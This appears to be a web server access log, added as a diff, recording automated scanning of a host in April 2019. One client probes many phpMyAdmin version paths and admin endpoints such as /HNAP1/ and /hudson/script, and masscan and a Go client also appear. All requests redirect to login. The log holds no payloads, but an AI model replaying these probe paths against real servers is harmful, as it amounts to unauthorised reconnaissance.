+::ffff:3.16.83.116 - - [11/Apr/2019:00:59:36 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:36 +0000] "GET /phpMyAdmin/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:42 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:47 +0000] "GET /PMA/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:48 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:49 +0000] "GET /pma/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:52 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:53 +0000] "GET /admin/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:54 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:55 +0000] "GET /dbadmin/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:58 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:59 +0000] "GET /mysql/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:01 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:03 +0000] "GET /myadmin/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:04 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:05 +0000] "GET /openserver/phpmyadmin/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:07 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:11 +0000] "GET /phpmyadmin2/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:12 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:16 +0000] "GET /phpMyAdmin2/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:18 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:19 +0000] "GET /phpMyAdmin-2/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:22 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:24 +0000] "GET /php-my-admin/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:27 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:29 +0000] "GET /phpMyAdmin-2.2.3/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:31 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:32 +0000] "GET /phpMyAdmin-2.2.6/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:34 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:35 +0000] "GET /phpMyAdmin-2.5.1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:37 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:39 +0000] "GET /phpMyAdmin-2.5.4/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:40 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:42 +0000] "GET /phpMyAdmin-2.5.5-rc1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:44 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:46 +0000] "GET /phpMyAdmin-2.5.5-rc2/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:47 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:50 +0000] "GET /phpMyAdmin-2.5.5/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:53 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:55 +0000] "GET /phpMyAdmin-2.5.5-pl1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:56 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:00:57 +0000] "GET /phpMyAdmin-2.5.6-rc1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:00 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:01 +0000] "GET /phpMyAdmin-2.5.6-rc2/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:04 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:05 +0000] "GET /phpMyAdmin-2.5.6/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:06 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:07 +0000] "GET /phpMyAdmin-2.5.7/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:09 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:09 +0000] "GET /phpMyAdmin-2.5.7-pl1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:12 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:16 +0000] "GET /phpMyAdmin-2.6.0-alpha/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:18 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:19 +0000] "GET /phpMyAdmin-2.6.0-alpha2/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:21 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:22 +0000] "GET /phpMyAdmin-2.6.0-beta1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:27 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:29 +0000] "GET /phpMyAdmin-2.6.0-beta2/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:31 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:33 +0000] "GET /phpMyAdmin-2.6.0-rc1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:35 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:37 +0000] "GET /phpMyAdmin-2.6.0-rc2/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:38 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:39 +0000] "GET /phpMyAdmin-2.6.0-rc3/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:43 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:47 +0000] "GET /phpMyAdmin-2.6.0/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:49 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:50 +0000] "GET /phpMyAdmin-2.6.0-pl1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:51 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:52 +0000] "GET /phpMyAdmin-2.6.0-pl2/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:56 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:58 +0000] "GET /phpMyAdmin-2.6.0-pl3/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:01:59 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:00 +0000] "GET /phpMyAdmin-2.6.1-rc1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:02 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:05 +0000] "GET /phpMyAdmin-2.6.1-rc2/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:08 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:09 +0000] "GET /phpMyAdmin-2.6.1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:11 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:13 +0000] "GET /phpMyAdmin-2.6.1-pl1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:15 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:18 +0000] "GET /phpMyAdmin-2.6.1-pl2/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:19 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:29 +0000] "GET /phpMyAdmin-2.6.1-pl3/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:31 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:32 +0000] "GET /phpMyAdmin-2.6.2-rc1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:34 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:39 +0000] "GET /phpMyAdmin-2.6.2-beta1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:41 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:42 +0000] "GET /phpMyAdmin-2.6.2-rc1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:45 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:46 +0000] "GET /phpMyAdmin-2.6.2/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:01:02:49 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:01:21:48 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:01:21:48 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:01:44:00 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:01:44:00 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:02:06:12 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:02:06:12 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:02:28:24 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:02:28:24 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:104.152.52.26 - - [11/Apr/2019:02:33:48 +0000] "GET / HTTP/1.0" 302 28 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
+welcome: Unable to identify user...redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:41:10 +0000] "GET / HTTP/1.1" 302 56 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:41:11 +0000] "GET /login HTTP/1.1" 200 7268 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:41:13 +0000] "GET http://www.msftncsi.com/ncsi.txt HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:41:14 +0000] "GET /HNAP1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:41:16 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:41:18 +0000] "GET /hudson/script HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:41:19 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:41:19 +0000] "GET /script HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:41:20 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:41:22 +0000] "GET /sqlite/main.php HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:41:23 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:02:41:25 +0000] "GET /sqlitemanager/main.php HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:02:41:26 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
